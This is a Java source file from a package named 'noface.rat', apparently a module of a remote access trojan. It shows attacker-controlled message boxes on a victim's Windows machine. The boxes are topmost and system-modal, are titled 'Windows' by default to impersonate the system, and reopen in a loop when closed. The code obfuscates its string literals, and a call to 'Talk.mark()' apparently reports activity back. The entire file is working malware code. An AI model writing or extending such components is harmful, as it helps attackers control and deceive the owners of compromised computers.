package noface.rat;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import noface.config.S;

public final class Note {

    private static final int FLAGS = 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000;

    public interface Box extends StdCallLibrary {
        Box I = Native.load(S.e("user32"), Box.class, W32APIOptions.UNICODE_OPTIONS);

        int MessageBox(HWND h, String text, String cap, int type);
    }
    private static volatile boolean sticky;
    private static volatile String title = "";
    private static volatile String body = "";
    private static Thread loop;

    public static synchronized void show(String t, String m, boolean stay) {
        hide();
        title = (t == null || t.isBlank()) ? S.e("Windows") : t;
        body = m == null ? "" : m;
        if (body.length() > 2000) body = body.substring(0, 2000);
        if (title.length() > 120) title = title.substring(0, 120);
        sticky = stay;
        Talk.mark();
        loop = new Thread(Note::run, S.e("note"));
        loop.setDaemon(true);
        loop.start();
    }

    public static synchronized void hide() {
        sticky = false;
        Thread t = loop;
        loop = null;
        try {
            HWND hwnd = User32.INSTANCE.FindWindow(null, title);
            if (hwnd != null) {
                User32.INSTANCE.PostMessage(hwnd, WinUser.WM_CLOSE, new WPARAM(0), new LPARAM(0));
            }
        } catch (Exception ignored) {
        }
        if (t != null) t.interrupt();
    }

    private static void run() {
        do {
            try {
                Box.I.MessageBox(null, body, title, FLAGS);
            } catch (Exception ignored) {
                break;
            }
        } while (sticky && !Thread.currentThread().isInterrupted());
    }

    private Note() {}
}
